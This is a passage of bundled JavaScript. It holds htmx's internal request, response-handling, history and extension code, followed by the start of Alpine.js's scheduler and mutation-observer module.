            resolveTarget(context.source),
            context.event,
            {
              handler: context.handler,
              headers: context.headers,
              values: context.values,
              targetOverride: resolveTarget(context.target),
              swapOverride: context.swap,
              select: context.select,
              returnPromise: true
            }
          );
        }
      } else {
        return issueAjaxRequest(verb, path, null, null, {
          returnPromise: true
        });
      }
    }
    function hierarchyForElt(elt) {
      const arr = [];
      while (elt) {
        arr.push(elt);
        elt = elt.parentElement;
      }
      return arr;
    }
    function verifyPath(elt, path, requestConfig) {
      let sameHost;
      let url;
      if (typeof URL === "function") {
        url = new URL(path, document.location.href);
        const origin = document.location.origin;
        sameHost = origin === url.origin;
      } else {
        url = path;
        sameHost = startsWith(path, document.location.origin);
      }
      if (htmx.config.selfRequestsOnly) {
        if (!sameHost) {
          return false;
        }
      }
      return triggerEvent(elt, "htmx:validateUrl", mergeObjects({ url, sameHost }, requestConfig));
    }
    function formDataFromObject(obj) {
      if (obj instanceof FormData) return obj;
      const formData = new FormData();
      for (const key in obj) {
        if (obj.hasOwnProperty(key)) {
          if (typeof obj[key].forEach === "function") {
            obj[key].forEach(function(v) {
              formData.append(key, v);
            });
          } else if (typeof obj[key] === "object" && !(obj[key] instanceof Blob)) {
            formData.append(key, JSON.stringify(obj[key]));
          } else {
            formData.append(key, obj[key]);
          }
        }
      }
      return formData;
    }
    function formDataArrayProxy(formData, name, array) {
      return new Proxy(array, {
        get: function(target, key) {
          if (typeof key === "number") return target[key];
          if (key === "length") return target.length;
          if (key === "push") {
            return function(value) {
              target.push(value);
              formData.append(name, value);
            };
          }
          if (typeof target[key] === "function") {
            return function() {
              target[key].apply(target, arguments);
              formData.delete(name);
              target.forEach(function(v) {
                formData.append(name, v);
              });
            };
          }
          if (target[key] && target[key].length === 1) {
            return target[key][0];
          } else {
            return target[key];
          }
        },
        set: function(target, index, value) {
          target[index] = value;
          formData.delete(name);
          target.forEach(function(v) {
            formData.append(name, v);
          });
          return true;
        }
      });
    }
    function formDataProxy(formData) {
      return new Proxy(formData, {
        get: function(target, name) {
          if (typeof name === "symbol") {
            return Reflect.get(target, name);
          }
          if (name === "toJSON") {
            return () => Object.fromEntries(formData);
          }
          if (name in target) {
            if (typeof target[name] === "function") {
              return function() {
                return formData[name].apply(formData, arguments);
              };
            } else {
              return target[name];
            }
          }
          const array = formData.getAll(name);
          if (array.length === 0) {
            return void 0;
          } else if (array.length === 1) {
            return array[0];
          } else {
            return formDataArrayProxy(target, name, array);
          }
        },
        set: function(target, name, value) {
          if (typeof name !== "string") {
            return false;
          }
          target.delete(name);
          if (typeof value.forEach === "function") {
            value.forEach(function(v) {
              target.append(name, v);
            });
          } else if (typeof value === "object" && !(value instanceof Blob)) {
            target.append(name, JSON.stringify(value));
          } else {
            target.append(name, value);
          }
          return true;
        },
        deleteProperty: function(target, name) {
          if (typeof name === "string") {
            target.delete(name);
          }
          return true;
        },
        // Support Object.assign call from proxy
        ownKeys: function(target) {
          return Reflect.ownKeys(Object.fromEntries(target));
        },
        getOwnPropertyDescriptor: function(target, prop) {
          return Reflect.getOwnPropertyDescriptor(Object.fromEntries(target), prop);
        }
      });
    }
    function issueAjaxRequest(verb, path, elt, event, etc, confirmed) {
      let resolve = null;
      let reject = null;
      etc = etc != null ? etc : {};
      if (etc.returnPromise && typeof Promise !== "undefined") {
        var promise = new Promise(function(_resolve, _reject) {
          resolve = _resolve;
          reject = _reject;
        });
      }
      if (elt == null) {
        elt = getDocument().body;
      }
      const responseHandler = etc.handler || handleAjaxResponse;
      const select = etc.select || null;
      if (!bodyContains(elt)) {
        maybeCall(resolve);
        return promise;
      }
      const target = etc.targetOverride || asElement(getTarget(elt));
      if (target == null || target == DUMMY_ELT) {
        triggerErrorEvent(elt, "htmx:targetError", { target: getAttributeValue(elt, "hx-target") });
        maybeCall(reject);
        return promise;
      }
      let eltData = getInternalData(elt);
      const submitter = eltData.lastButtonClicked;
      if (submitter) {
        const buttonPath = getRawAttribute(submitter, "formaction");
        if (buttonPath != null) {
          path = buttonPath;
        }
        const buttonVerb = getRawAttribute(submitter, "formmethod");
        if (buttonVerb != null) {
          if (buttonVerb.toLowerCase() !== "dialog") {
            verb = /** @type HttpVerb */
            buttonVerb;
          }
        }
      }
      const confirmQuestion = getClosestAttributeValue(elt, "hx-confirm");
      if (confirmed === void 0) {
        const issueRequest = function(skipConfirmation) {
          return issueAjaxRequest(verb, path, elt, event, etc, !!skipConfirmation);
        };
        const confirmDetails = { target, elt, path, verb, triggeringEvent: event, etc, issueRequest, question: confirmQuestion };
        if (triggerEvent(elt, "htmx:confirm", confirmDetails) === false) {
          maybeCall(resolve);
          return promise;
        }
      }
      let syncElt = elt;
      let syncStrategy = getClosestAttributeValue(elt, "hx-sync");
      let queueStrategy = null;
      let abortable = false;
      if (syncStrategy) {
        const syncStrings = syncStrategy.split(":");
        const selector = syncStrings[0].trim();
        if (selector === "this") {
          syncElt = findThisElement(elt, "hx-sync");
        } else {
          syncElt = asElement(querySelectorExt(elt, selector));
        }
        syncStrategy = (syncStrings[1] || "drop").trim();
        eltData = getInternalData(syncElt);
        if (syncStrategy === "drop" && eltData.xhr && eltData.abortable !== true) {
          maybeCall(resolve);
          return promise;
        } else if (syncStrategy === "abort") {
          if (eltData.xhr) {
            maybeCall(resolve);
            return promise;
          } else {
            abortable = true;
          }
        } else if (syncStrategy === "replace") {
          triggerEvent(syncElt, "htmx:abort");
        } else if (syncStrategy.indexOf("queue") === 0) {
          const queueStrArray = syncStrategy.split(" ");
          queueStrategy = (queueStrArray[1] || "last").trim();
        }
      }
      if (eltData.xhr) {
        if (eltData.abortable) {
          triggerEvent(syncElt, "htmx:abort");
        } else {
          if (queueStrategy == null) {
            if (event) {
              const eventData = getInternalData(event);
              if (eventData && eventData.triggerSpec && eventData.triggerSpec.queue) {
                queueStrategy = eventData.triggerSpec.queue;
              }
            }
            if (queueStrategy == null) {
              queueStrategy = "last";
            }
          }
          if (eltData.queuedRequests == null) {
            eltData.queuedRequests = [];
          }
          if (queueStrategy === "first" && eltData.queuedRequests.length === 0) {
            eltData.queuedRequests.push(function() {
              issueAjaxRequest(verb, path, elt, event, etc);
            });
          } else if (queueStrategy === "all") {
            eltData.queuedRequests.push(function() {
              issueAjaxRequest(verb, path, elt, event, etc);
            });
          } else if (queueStrategy === "last") {
            eltData.queuedRequests = [];
            eltData.queuedRequests.push(function() {
              issueAjaxRequest(verb, path, elt, event, etc);
            });
          }
          maybeCall(resolve);
          return promise;
        }
      }
      const xhr = new XMLHttpRequest();
      eltData.xhr = xhr;
      eltData.abortable = abortable;
      const endRequestLock = function() {
        eltData.xhr = null;
        eltData.abortable = false;
        if (eltData.queuedRequests != null && eltData.queuedRequests.length > 0) {
          const queuedRequest = eltData.queuedRequests.shift();
          queuedRequest();
        }
      };
      const promptQuestion = getClosestAttributeValue(elt, "hx-prompt");
      if (promptQuestion) {
        var promptResponse = prompt(promptQuestion);
        if (promptResponse === null || !triggerEvent(elt, "htmx:prompt", { prompt: promptResponse, target })) {
          maybeCall(resolve);
          endRequestLock();
          return promise;
        }
      }
      if (confirmQuestion && !confirmed) {
        if (!confirm(confirmQuestion)) {
          maybeCall(resolve);
          endRequestLock();
          return promise;
        }
      }
      let headers = getHeaders(elt, target, promptResponse);
      if (verb !== "get" && !usesFormData(elt)) {
        headers["Content-Type"] = "application/x-www-form-urlencoded";
      }
      if (etc.headers) {
        headers = mergeObjects(headers, etc.headers);
      }
      const results = getInputValues(elt, verb);
      let errors = results.errors;
      const rawFormData = results.formData;
      if (etc.values) {
        overrideFormData(rawFormData, formDataFromObject(etc.values));
      }
      const expressionVars = formDataFromObject(getExpressionVars(elt));
      const allFormData = overrideFormData(rawFormData, expressionVars);
      let filteredFormData = filterValues(allFormData, elt);
      if (htmx.config.getCacheBusterParam && verb === "get") {
        filteredFormData.set("org.htmx.cache-buster", getRawAttribute(target, "id") || "true");
      }
      if (path == null || path === "") {
        path = getDocument().location.href;
      }
      const requestAttrValues = getValuesForElement(elt, "hx-request");
      const eltIsBoosted = getInternalData(elt).boosted;
      let useUrlParams = htmx.config.methodsThatUseUrlParams.indexOf(verb) >= 0;
      const requestConfig = {
        boosted: eltIsBoosted,
        useUrlParams,
        formData: filteredFormData,
        parameters: formDataProxy(filteredFormData),
        unfilteredFormData: allFormData,
        unfilteredParameters: formDataProxy(allFormData),
        headers,
        target,
        verb,
        errors,
        withCredentials: etc.credentials || requestAttrValues.credentials || htmx.config.withCredentials,
        timeout: etc.timeout || requestAttrValues.timeout || htmx.config.timeout,
        path,
        triggeringEvent: event
      };
      if (!triggerEvent(elt, "htmx:configRequest", requestConfig)) {
        maybeCall(resolve);
        endRequestLock();
        return promise;
      }
      path = requestConfig.path;
      verb = requestConfig.verb;
      headers = requestConfig.headers;
      filteredFormData = formDataFromObject(requestConfig.parameters);
      errors = requestConfig.errors;
      useUrlParams = requestConfig.useUrlParams;
      if (errors && errors.length > 0) {
        triggerEvent(elt, "htmx:validation:halted", requestConfig);
        maybeCall(resolve);
        endRequestLock();
        return promise;
      }
      const splitPath = path.split("#");
      const pathNoAnchor = splitPath[0];
      const anchor = splitPath[1];
      let finalPath = path;
      if (useUrlParams) {
        finalPath = pathNoAnchor;
        const hasValues = !filteredFormData.keys().next().done;
        if (hasValues) {
          if (finalPath.indexOf("?") < 0) {
            finalPath += "?";
          } else {
            finalPath += "&";
          }
          finalPath += urlEncode(filteredFormData);
          if (anchor) {
            finalPath += "#" + anchor;
          }
        }
      }
      if (!verifyPath(elt, finalPath, requestConfig)) {
        triggerErrorEvent(elt, "htmx:invalidPath", requestConfig);
        maybeCall(reject);
        return promise;
      }
      xhr.open(verb.toUpperCase(), finalPath, true);
      xhr.overrideMimeType("text/html");
      xhr.withCredentials = requestConfig.withCredentials;
      xhr.timeout = requestConfig.timeout;
      if (requestAttrValues.noHeaders) {
      } else {
        for (const header in headers) {
          if (headers.hasOwnProperty(header)) {
            const headerValue = headers[header];
            safelySetHeaderValue(xhr, header, headerValue);
          }
        }
      }
      const responseInfo = {
        xhr,
        target,
        requestConfig,
        etc,
        boosted: eltIsBoosted,
        select,
        pathInfo: {
          requestPath: path,
          finalRequestPath: finalPath,
          responsePath: null,
          anchor
        }
      };
      xhr.onload = function() {
        try {
          const hierarchy = hierarchyForElt(elt);
          responseInfo.pathInfo.responsePath = getPathFromResponse(xhr);
          responseHandler(elt, responseInfo);
          if (responseInfo.keepIndicators !== true) {
            removeRequestIndicators(indicators, disableElts);
          }
          triggerEvent(elt, "htmx:afterRequest", responseInfo);
          triggerEvent(elt, "htmx:afterOnLoad", responseInfo);
          if (!bodyContains(elt)) {
            let secondaryTriggerElt = null;
            while (hierarchy.length > 0 && secondaryTriggerElt == null) {
              const parentEltInHierarchy = hierarchy.shift();
              if (bodyContains(parentEltInHierarchy)) {
                secondaryTriggerElt = parentEltInHierarchy;
              }
            }
            if (secondaryTriggerElt) {
              triggerEvent(secondaryTriggerElt, "htmx:afterRequest", responseInfo);
              triggerEvent(secondaryTriggerElt, "htmx:afterOnLoad", responseInfo);
            }
          }
          maybeCall(resolve);
          endRequestLock();
        } catch (e) {
          triggerErrorEvent(elt, "htmx:onLoadError", mergeObjects({ error: e }, responseInfo));
          throw e;
        }
      };
      xhr.onerror = function() {
        removeRequestIndicators(indicators, disableElts);
        triggerErrorEvent(elt, "htmx:afterRequest", responseInfo);
        triggerErrorEvent(elt, "htmx:sendError", responseInfo);
        maybeCall(reject);
        endRequestLock();
      };
      xhr.onabort = function() {
        removeRequestIndicators(indicators, disableElts);
        triggerErrorEvent(elt, "htmx:afterRequest", responseInfo);
        triggerErrorEvent(elt, "htmx:sendAbort", responseInfo);
        maybeCall(reject);
        endRequestLock();
      };
      xhr.ontimeout = function() {
        removeRequestIndicators(indicators, disableElts);
        triggerErrorEvent(elt, "htmx:afterRequest", responseInfo);
        triggerErrorEvent(elt, "htmx:timeout", responseInfo);
        maybeCall(reject);
        endRequestLock();
      };
      if (!triggerEvent(elt, "htmx:beforeRequest", responseInfo)) {
        maybeCall(resolve);
        endRequestLock();
        return promise;
      }
      var indicators = addRequestIndicatorClasses(elt);
      var disableElts = disableElements(elt);
      forEach(["loadstart", "loadend", "progress", "abort"], function(eventName) {
        forEach([xhr, xhr.upload], function(target2) {
          target2.addEventListener(eventName, function(event2) {
            triggerEvent(elt, "htmx:xhr:" + eventName, {
              lengthComputable: event2.lengthComputable,
              loaded: event2.loaded,
              total: event2.total
            });
          });
        });
      });
      triggerEvent(elt, "htmx:beforeSend", responseInfo);
      const params = useUrlParams ? null : encodeParamsForBody(xhr, elt, filteredFormData);
      xhr.send(params);
      return promise;
    }
    function determineHistoryUpdates(elt, responseInfo) {
      const xhr = responseInfo.xhr;
      let pathFromHeaders = null;
      let typeFromHeaders = null;
      if (hasHeader(xhr, /HX-Push:/i)) {
        pathFromHeaders = xhr.getResponseHeader("HX-Push");
        typeFromHeaders = "push";
      } else if (hasHeader(xhr, /HX-Push-Url:/i)) {
        pathFromHeaders = xhr.getResponseHeader("HX-Push-Url");
        typeFromHeaders = "push";
      } else if (hasHeader(xhr, /HX-Replace-Url:/i)) {
        pathFromHeaders = xhr.getResponseHeader("HX-Replace-Url");
        typeFromHeaders = "replace";
      }
      if (pathFromHeaders) {
        if (pathFromHeaders === "false") {
          return {};
        } else {
          return {
            type: typeFromHeaders,
            path: pathFromHeaders
          };
        }
      }
      const requestPath = responseInfo.pathInfo.finalRequestPath;
      const responsePath = responseInfo.pathInfo.responsePath;
      const pushUrl = getClosestAttributeValue(elt, "hx-push-url");
      const replaceUrl = getClosestAttributeValue(elt, "hx-replace-url");
      const elementIsBoosted = getInternalData(elt).boosted;
      let saveType = null;
      let path = null;
      if (pushUrl) {
        saveType = "push";
        path = pushUrl;
      } else if (replaceUrl) {
        saveType = "replace";
        path = replaceUrl;
      } else if (elementIsBoosted) {
        saveType = "push";
        path = responsePath || requestPath;
      }
      if (path) {
        if (path === "false") {
          return {};
        }
        if (path === "true") {
          path = responsePath || requestPath;
        }
        if (responseInfo.pathInfo.anchor && path.indexOf("#") === -1) {
          path = path + "#" + responseInfo.pathInfo.anchor;
        }
        return {
          type: saveType,
          path
        };
      } else {
        return {};
      }
    }
    function codeMatches(responseHandlingConfig, status) {
      var regExp = new RegExp(responseHandlingConfig.code);
      return regExp.test(status.toString(10));
    }
    function resolveResponseHandling(xhr) {
      for (var i = 0; i < htmx.config.responseHandling.length; i++) {
        var responseHandlingElement = htmx.config.responseHandling[i];
        if (codeMatches(responseHandlingElement, xhr.status)) {
          return responseHandlingElement;
        }
      }
      return {
        swap: false
      };
    }
    function handleTitle(title) {
      if (title) {
        const titleElt = find("title");
        if (titleElt) {
          titleElt.innerHTML = title;
        } else {
          window.document.title = title;
        }
      }
    }
    function handleAjaxResponse(elt, responseInfo) {
      const xhr = responseInfo.xhr;
      let target = responseInfo.target;
      const etc = responseInfo.etc;
      const responseInfoSelect = responseInfo.select;
      if (!triggerEvent(elt, "htmx:beforeOnLoad", responseInfo)) return;
      if (hasHeader(xhr, /HX-Trigger:/i)) {
        handleTriggerHeader(xhr, "HX-Trigger", elt);
      }
      if (hasHeader(xhr, /HX-Location:/i)) {
        saveCurrentPageToHistory();
        let redirectPath = xhr.getResponseHeader("HX-Location");
        var redirectSwapSpec;
        if (redirectPath.indexOf("{") === 0) {
          redirectSwapSpec = parseJSON(redirectPath);
          redirectPath = redirectSwapSpec.path;
          delete redirectSwapSpec.path;
        }
        ajaxHelper("get", redirectPath, redirectSwapSpec).then(function() {
          pushUrlIntoHistory(redirectPath);
        });
        return;
      }
      const shouldRefresh = hasHeader(xhr, /HX-Refresh:/i) && xhr.getResponseHeader("HX-Refresh") === "true";
      if (hasHeader(xhr, /HX-Redirect:/i)) {
        responseInfo.keepIndicators = true;
        location.href = xhr.getResponseHeader("HX-Redirect");
        shouldRefresh && location.reload();
        return;
      }
      if (shouldRefresh) {
        responseInfo.keepIndicators = true;
        location.reload();
        return;
      }
      if (hasHeader(xhr, /HX-Retarget:/i)) {
        if (xhr.getResponseHeader("HX-Retarget") === "this") {
          responseInfo.target = elt;
        } else {
          responseInfo.target = asElement(querySelectorExt(elt, xhr.getResponseHeader("HX-Retarget")));
        }
      }
      const historyUpdate = determineHistoryUpdates(elt, responseInfo);
      const responseHandling = resolveResponseHandling(xhr);
      const shouldSwap = responseHandling.swap;
      let isError = !!responseHandling.error;
      let ignoreTitle = htmx.config.ignoreTitle || responseHandling.ignoreTitle;
      let selectOverride = responseHandling.select;
      if (responseHandling.target) {
        responseInfo.target = asElement(querySelectorExt(elt, responseHandling.target));
      }
      var swapOverride = etc.swapOverride;
      if (swapOverride == null && responseHandling.swapOverride) {
        swapOverride = responseHandling.swapOverride;
      }
      if (hasHeader(xhr, /HX-Retarget:/i)) {
        if (xhr.getResponseHeader("HX-Retarget") === "this") {
          responseInfo.target = elt;
        } else {
          responseInfo.target = asElement(querySelectorExt(elt, xhr.getResponseHeader("HX-Retarget")));
        }
      }
      if (hasHeader(xhr, /HX-Reswap:/i)) {
        swapOverride = xhr.getResponseHeader("HX-Reswap");
      }
      var serverResponse = xhr.response;
      var beforeSwapDetails = mergeObjects({
        shouldSwap,
        serverResponse,
        isError,
        ignoreTitle,
        selectOverride
      }, responseInfo);
      if (responseHandling.event && !triggerEvent(target, responseHandling.event, beforeSwapDetails)) return;
      if (!triggerEvent(target, "htmx:beforeSwap", beforeSwapDetails)) return;
      target = beforeSwapDetails.target;
      serverResponse = beforeSwapDetails.serverResponse;
      isError = beforeSwapDetails.isError;
      ignoreTitle = beforeSwapDetails.ignoreTitle;
      selectOverride = beforeSwapDetails.selectOverride;
      responseInfo.target = target;
      responseInfo.failed = isError;
      responseInfo.successful = !isError;
      if (beforeSwapDetails.shouldSwap) {
        if (xhr.status === 286) {
          cancelPolling(elt);
        }
        withExtensions(elt, function(extension) {
          serverResponse = extension.transformResponse(serverResponse, xhr, elt);
        });
        if (historyUpdate.type) {
          saveCurrentPageToHistory();
        }
        if (hasHeader(xhr, /HX-Reswap:/i)) {
          swapOverride = xhr.getResponseHeader("HX-Reswap");
        }
        var swapSpec = getSwapSpecification(elt, swapOverride);
        if (!swapSpec.hasOwnProperty("ignoreTitle")) {
          swapSpec.ignoreTitle = ignoreTitle;
        }
        target.classList.add(htmx.config.swappingClass);
        let settleResolve = null;
        let settleReject = null;
        if (responseInfoSelect) {
          selectOverride = responseInfoSelect;
        }
        if (hasHeader(xhr, /HX-Reselect:/i)) {
          selectOverride = xhr.getResponseHeader("HX-Reselect");
        }
        const selectOOB = getClosestAttributeValue(elt, "hx-select-oob");
        const select = getClosestAttributeValue(elt, "hx-select");
        let doSwap = function() {
          try {
            if (historyUpdate.type) {
              triggerEvent(getDocument().body, "htmx:beforeHistoryUpdate", mergeObjects({ history: historyUpdate }, responseInfo));
              if (historyUpdate.type === "push") {
                pushUrlIntoHistory(historyUpdate.path);
                triggerEvent(getDocument().body, "htmx:pushedIntoHistory", { path: historyUpdate.path });
              } else {
                replaceUrlInHistory(historyUpdate.path);
                triggerEvent(getDocument().body, "htmx:replacedInHistory", { path: historyUpdate.path });
              }
            }
            swap(target, serverResponse, swapSpec, {
              select: selectOverride || select,
              selectOOB,
              eventInfo: responseInfo,
              anchor: responseInfo.pathInfo.anchor,
              contextElement: elt,
              afterSwapCallback: function() {
                if (hasHeader(xhr, /HX-Trigger-After-Swap:/i)) {
                  let finalElt = elt;
                  if (!bodyContains(elt)) {
                    finalElt = getDocument().body;
                  }
                  handleTriggerHeader(xhr, "HX-Trigger-After-Swap", finalElt);
                }
              },
              afterSettleCallback: function() {
                if (hasHeader(xhr, /HX-Trigger-After-Settle:/i)) {
                  let finalElt = elt;
                  if (!bodyContains(elt)) {
                    finalElt = getDocument().body;
                  }
                  handleTriggerHeader(xhr, "HX-Trigger-After-Settle", finalElt);
                }
                maybeCall(settleResolve);
              }
            });
          } catch (e) {
            triggerErrorEvent(elt, "htmx:swapError", responseInfo);
            maybeCall(settleReject);
            throw e;
          }
        };
        let shouldTransition = htmx.config.globalViewTransitions;
        if (swapSpec.hasOwnProperty("transition")) {
          shouldTransition = swapSpec.transition;
        }
        if (shouldTransition && triggerEvent(elt, "htmx:beforeTransition", responseInfo) && typeof Promise !== "undefined" && // @ts-ignore experimental feature atm
        document.startViewTransition) {
          const settlePromise = new Promise(function(_resolve, _reject) {
            settleResolve = _resolve;
            settleReject = _reject;
          });
          const innerDoSwap = doSwap;
          doSwap = function() {
            document.startViewTransition(function() {
              innerDoSwap();
              return settlePromise;
            });
          };
        }
        if (swapSpec.swapDelay > 0) {
          getWindow().setTimeout(doSwap, swapSpec.swapDelay);
        } else {
          doSwap();
        }
      }
      if (isError) {
        triggerErrorEvent(elt, "htmx:responseError", mergeObjects({ error: "Response Status Error Code " + xhr.status + " from " + responseInfo.pathInfo.requestPath }, responseInfo));
      }
    }
    const extensions = {};
    function extensionBase() {
      return {
        init: function(api2) {
          return null;
        },
        getSelectors: function() {
          return null;
        },
        onEvent: function(name, evt) {
          return true;
        },
        transformResponse: function(text2, xhr, elt) {
          return text2;
        },
        isInlineSwap: function(swapStyle) {
          return false;
        },
        handleSwap: function(swapStyle, target, fragment, settleInfo) {
          return false;
        },
        encodeParameters: function(xhr, parameters, elt) {
          return null;
        }
      };
    }
    function defineExtension(name, extension) {
      if (extension.init) {
        extension.init(internalAPI);
      }
      extensions[name] = mergeObjects(extensionBase(), extension);
    }
    function removeExtension(name) {
      delete extensions[name];
    }
    function getExtensions(elt, extensionsToReturn, extensionsToIgnore) {
      if (extensionsToReturn == void 0) {
        extensionsToReturn = [];
      }
      if (elt == void 0) {
        return extensionsToReturn;
      }
      if (extensionsToIgnore == void 0) {
        extensionsToIgnore = [];
      }
      const extensionsForElement = getAttributeValue(elt, "hx-ext");
      if (extensionsForElement) {
        forEach(extensionsForElement.split(","), function(extensionName) {
          extensionName = extensionName.replace(/ /g, "");
          if (extensionName.slice(0, 7) == "ignore:") {
            extensionsToIgnore.push(extensionName.slice(7));
            return;
          }
          if (extensionsToIgnore.indexOf(extensionName) < 0) {
            const extension = extensions[extensionName];
            if (extension && extensionsToReturn.indexOf(extension) < 0) {
              extensionsToReturn.push(extension);
            }
          }
        });
      }
      return getExtensions(asElement(parentElt(elt)), extensionsToReturn, extensionsToIgnore);
    }
    var isReady = false;
    getDocument().addEventListener("DOMContentLoaded", function() {
      isReady = true;
    });
    function ready(fn) {
      if (isReady || getDocument().readyState === "complete") {
        fn();
      } else {
        getDocument().addEventListener("DOMContentLoaded", fn);
      }
    }
    function insertIndicatorStyles() {
      if (htmx.config.includeIndicatorStyles !== false) {
        const nonceAttribute = htmx.config.inlineStyleNonce ? ` nonce="${htmx.config.inlineStyleNonce}"` : "";
        getDocument().head.insertAdjacentHTML(
          "beforeend",
          "<style" + nonceAttribute + ">      ." + htmx.config.indicatorClass + "{opacity:0}      ." + htmx.config.requestClass + " ." + htmx.config.indicatorClass + "{opacity:1; transition: opacity 200ms ease-in;}      ." + htmx.config.requestClass + "." + htmx.config.indicatorClass + "{opacity:1; transition: opacity 200ms ease-in;}      </style>"
        );
      }
    }
    function getMetaConfig() {
      const element = getDocument().querySelector('meta[name="htmx-config"]');
      if (element) {
        return parseJSON(element.content);
      } else {
        return null;
      }
    }
    function mergeMetaConfig() {
      const metaConfig = getMetaConfig();
      if (metaConfig) {
        htmx.config = mergeObjects(htmx.config, metaConfig);
      }
    }
    ready(function() {
      mergeMetaConfig();
      insertIndicatorStyles();
      let body = getDocument().body;
      processNode(body);
      const restoredElts = getDocument().querySelectorAll(
        "[hx-trigger='restored'],[data-hx-trigger='restored']"
      );
      body.addEventListener("htmx:abort", function(evt) {
        const target = evt.target;
        const internalData = getInternalData(target);
        if (internalData && internalData.xhr) {
          internalData.xhr.abort();
        }
      });
      const originalPopstate = window.onpopstate ? window.onpopstate.bind(window) : null;
      window.onpopstate = function(event) {
        if (event.state && event.state.htmx) {
          restoreHistory();
          forEach(restoredElts, function(elt) {
            triggerEvent(elt, "htmx:restored", {
              document: getDocument(),
              triggerEvent
            });
          });
        } else {
          if (originalPopstate) {
            originalPopstate(event);
          }
        }
      };
      getWindow().setTimeout(function() {
        triggerEvent(body, "htmx:load", {});
        body = null;
      }, 0);
    });
    return htmx;
  }();
  var htmx_esm_default = htmx2;

  // node_modules/alpinejs/dist/module.esm.js
  var flushPending = false;
  var flushing = false;
  var queue = [];
  var lastFlushedIndex = -1;
  function scheduler(callback) {
    queueJob(callback);
  }
  function queueJob(job) {
    if (!queue.includes(job))
      queue.push(job);
    queueFlush();
  }
  function dequeueJob(job) {
    let index = queue.indexOf(job);
    if (index !== -1 && index > lastFlushedIndex)
      queue.splice(index, 1);
  }
  function queueFlush() {
    if (!flushing && !flushPending) {
      flushPending = true;
      queueMicrotask(flushJobs);
    }
  }
  function flushJobs() {
    flushPending = false;
    flushing = true;
    for (let i = 0; i < queue.length; i++) {
      queue[i]();
      lastFlushedIndex = i;
    }
    queue.length = 0;
    lastFlushedIndex = -1;
    flushing = false;
  }
  var reactive;
  var effect;
  var release;
  var raw;
  var shouldSchedule = true;
  function disableEffectScheduling(callback) {
    shouldSchedule = false;
    callback();
    shouldSchedule = true;
  }
  function setReactivityEngine(engine) {
    reactive = engine.reactive;
    release = engine.release;
    effect = (callback) => engine.effect(callback, { scheduler: (task) => {
      if (shouldSchedule) {
        scheduler(task);
      } else {
        task();
      }
    } });
    raw = engine.raw;
  }
  function overrideEffect(override) {
    effect = override;
  }
  function elementBoundEffect(el) {
    let cleanup2 = () => {
    };
    let wrappedEffect = (callback) => {
      let effectReference = effect(callback);
      if (!el._x_effects) {
        el._x_effects = /* @__PURE__ */ new Set();
        el._x_runEffects = () => {
          el._x_effects.forEach((i) => i());
        };
      }
      el._x_effects.add(effectReference);
      cleanup2 = () => {
        if (effectReference === void 0)
          return;
        el._x_effects.delete(effectReference);
        release(effectReference);
      };
      return effectReference;
    };
    return [wrappedEffect, () => {
      cleanup2();
    }];
  }
  function watch(getter, callback) {
    let firstTime = true;
    let oldValue;
    let effectReference = effect(() => {
      let value = getter();
      JSON.stringify(value);
      if (!firstTime) {
        queueMicrotask(() => {
          callback(value, oldValue);
          oldValue = value;
        });
      } else {
        oldValue = value;
      }
      firstTime = false;
    });
    return () => release(effectReference);
  }
  var onAttributeAddeds = [];
  var onElRemoveds = [];
  var onElAddeds = [];
  function onElAdded(callback) {
    onElAddeds.push(callback);
  }
  function onElRemoved(el, callback) {
    if (typeof callback === "function") {
      if (!el._x_cleanups)
        el._x_cleanups = [];
      el._x_cleanups.push(callback);
    } else {
      callback = el;
      onElRemoveds.push(callback);
    }
  }
  function onAttributesAdded(callback) {
    onAttributeAddeds.push(callback);
  }
  function onAttributeRemoved(el, name, callback) {
    if (!el._x_attributeCleanups)
      el._x_attributeCleanups = {};
    if (!el._x_attributeCleanups[name])
      el._x_attributeCleanups[name] = [];
    el._x_attributeCleanups[name].push(callback);
  }
  function cleanupAttributes(el, names) {
    if (!el._x_attributeCleanups)
      return;
    Object.entries(el._x_attributeCleanups).forEach(([name, value]) => {
      if (names === void 0 || names.includes(name)) {
        value.forEach((i) => i());
        delete el._x_attributeCleanups[name];
      }
    });
  }
  function cleanupElement(el) {
    if (el._x_cleanups) {
      while (el._x_cleanups.length)
        el._x_cleanups.pop()();
    }
  }
  var observer = new MutationObserver(onMutate);
  var currentlyObserving = false;
  function startObservingMutations() {
    observer.observe(document, { subtree: true, childList: true, attributes: true, attributeOldValue: true });
    currentlyObserving = true;
  }
  function stopObservingMutations() {
    flushObserver();
    observer.disconnect();
    currentlyObserving = false;
  }
  var queuedMutations = [];
  function flushObserver() {
    let records = observer.takeRecords();
    queuedMutations.push(() => records.length > 0 && onMutate(records));
    let queueLengthWhenTriggered = queuedMutations.length;
    queueMicrotask(() => {
      if (queuedMutations.length === queueLengthWhenTriggered) {
        while (queuedMutations.length > 0)
          queuedMutations.shift()();
      }
    });
  }
  function mutateDom(callback) {
    if (!currentlyObserving)
      return callback();
    stopObservingMutations();
    let result = callback();
    startObservingMutations();
    return result;
  }
  var isCollecting = false;
  var deferredMutations = [];
  function deferMutations() {
    isCollecting = true;
  }
  function flushAndStopDeferringMutations() {
    isCollecting = false;
    onMutate(deferredMutations);
    deferredMutations = [];
  }
  function onMutate(mutations) {
    if (isCollecting) {
      deferredMutations = deferredMutations.concat(mutations);
      return;
    }
    let addedNodes = /* @__PURE__ */ new Set();
    let removedNodes = /* @__PURE__ */ new Set();
    let addedAttributes = /* @__PURE__ */ new Map();
    let removedAttributes = /* @__PURE__ */ new Map();
    for (let i = 0; i < mutations.length; i++) {
      if (mutations[i].target._x_ignoreMutationObserver)
        continue;
      if (mutations[i].type === "childList") {
        mutations[i].addedNodes.forEach((node) => node.nodeType === 1 && addedNodes.add(node));
        mutations[i].removedNodes.forEach((node) => node.nodeType === 1 && removedNodes.add(node));
      }
      if (mutations[i].type === "attributes") {
        let el = mutations[i].target;
        let name = mutations[i].attributeName;
        let oldValue = mutations[i].oldValue;
        let add2 = () => {
          if (!addedAttributes.has(el))
            addedAttributes.set(el, []);
          addedAttributes.get(el).push({ name, value: el.getAttribute(name) });
        };
        let remove = () => {
          if (!removedAttributes.has(el))
            removedAttributes.set(el, []);
          removedAttributes.get(el).push(name);
        };
        if (el.hasAttribute(name) && oldValue === null) {
          add2();
        } else if (el.hasAttribute(name)) {
          remove();
          add2();
        } else {
          remove();
        }
      }
    }
    removedAttributes.forEach((attrs, el) => {
      cleanupAttributes(el, attrs);
    });
    addedAttributes.forEach((attrs, el) => {
      onAttributeAddeds.forEach((i) => i(el, attrs));
    });
    for (let node of removedNodes) {
      if (addedNodes.has(node))
        continue;
